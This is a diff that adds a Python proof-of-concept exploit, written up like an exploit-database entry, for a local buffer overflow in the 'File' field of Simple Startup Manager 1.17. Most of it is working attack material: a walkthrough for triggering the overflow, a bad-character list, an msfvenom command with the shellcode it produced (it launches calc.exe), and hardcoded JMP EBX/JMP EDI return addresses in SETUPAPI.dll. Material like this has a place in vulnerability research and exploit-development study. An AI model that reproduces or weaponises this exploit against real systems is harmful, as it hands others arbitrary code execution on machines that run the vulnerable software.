@@ -1,0 +1,58 @@
+# Exploit Title: Simple Startup Manager 1.17 - 'File' Local Buffer Overflow (PoC) 
+# Exploit Author: PovlTekstTV
+# Date: 2020-07-15
+# Vulnerable Software: Simple Startup Manager
+# Software Link Download: http://www.ashkon.com/download/startup-manager.exe
+# Version: 1.17
+# Vulnerability Type: Local Buffer Overflow
+# Tested on: Windows 7 Ultimate Service Pack 1 (32 and 64 bit)
+# DEP and ASLR Disabled on system
+# Space for shellcode: 264
+
+#!/usr/bin/python
+# Two sets of instructions are needed:
+# 1. JMP EDI
+# 2. JMP EBX 
+# I found these in the OS-module: SETUPAPI.dll, which is usually protected using ASLR
+# The exploit will properly not work unless changed/bruteforced.
+
+# It is also possible to overwrite the SEH-handler with 600+ bytes,
+# however I did not find any POP, POP, RETs.
+
+# Walkthrough:
+#   1.- Run the python script, it will create a new file "exploit.txt"
+#   2.- Copy the content of the new file 'exploit.txt' to clipboard
+#   3.- Turn off DEP for startup-manger.exe
+#   4.- Open 'startup-manger.exe'
+#   5.- Click 'New' or go to 'File' and click 'New'
+#   6.- Paste content from clipboard into 'File' parameter
+#   7.- Click on 'OK'
+#   9.- Calc.exe runs.
+
+#Identified the following badchars: x00 x0a x09 x0c x0d x3a x5c
+#msfvenom -p windows/exec cmd=calc.exe -f c -b "\x00\x0a\x0c\x0d\x3a\x5c"
+shellcode = ("\xdb\xd0\xd9\x74\x24\xf4\xbe\xcb\xe3\xc2\xa5\x5a\x33\xc9\xb1"
+"\x31\x83\xc2\x04\x31\x72\x14\x03\x72\xdf\x01\x37\x59\x37\x47"
+"\xb8\xa2\xc7\x28\x30\x47\xf6\x68\x26\x03\xa8\x58\x2c\x41\x44"
+"\x12\x60\x72\xdf\x56\xad\x75\x68\xdc\x8b\xb8\x69\x4d\xef\xdb"
+"\xe9\x8c\x3c\x3c\xd0\x5e\x31\x3d\x15\x82\xb8\x6f\xce\xc8\x6f"
+"\x80\x7b\x84\xb3\x2b\x37\x08\xb4\xc8\x8f\x2b\x95\x5e\x84\x75"
+"\x35\x60\x49\x0e\x7c\x7a\x8e\x2b\x36\xf1\x64\xc7\xc9\xd3\xb5"
+"\x28\x65\x1a\x7a\xdb\x77\x5a\xbc\x04\x02\x92\xbf\xb9\x15\x61"
+"\xc2\x65\x93\x72\x64\xed\x03\x5f\x95\x22\xd5\x14\x99\x8f\x91"
+"\x73\xbd\x0e\x75\x08\xb9\x9b\x78\xdf\x48\xdf\x5e\xfb\x11\xbb"
+"\xff\x5a\xff\x6a\xff\xbd\xa0\xd3\xa5\xb6\x4c\x07\xd4\x94\x1a"
+"\xd6\x6a\xa3\x68\xd8\x74\xac\xdc\xb1\x45\x27\xb3\xc6\x59\xe2"
+"\xf0\x39\x10\xaf\x50\xd2\xfd\x25\xe1\xbf\xfd\x93\x25\xc6\x7d"
+"\x16\xd5\x3d\x9d\x53\xd0\x7a\x19\x8f\xa8\x13\xcc\xaf\x1f\x13"
+"\xc5\xd3\xfe\x87\x85\x3d\x65\x20\x2f\x42")
+
+payload = shellcode
+payload += ("A"*(268-len(payload)-4))
+payload += ("\xe4\xa9\x4e\x76") #0x764ea9e4 (JMP EBX) {PAGE_READONLY} [SETUPAPI.dll]
+payload += ("\x5f\xbc\x4e\x76") #0x764ebc5f (JMP EDI) {PAGE_READONLY} [SETUPAPI.dll]
+
+#Write payload to file
+file = open("exploit.txt" , 'w')
+file.write(payload)
+file.close()
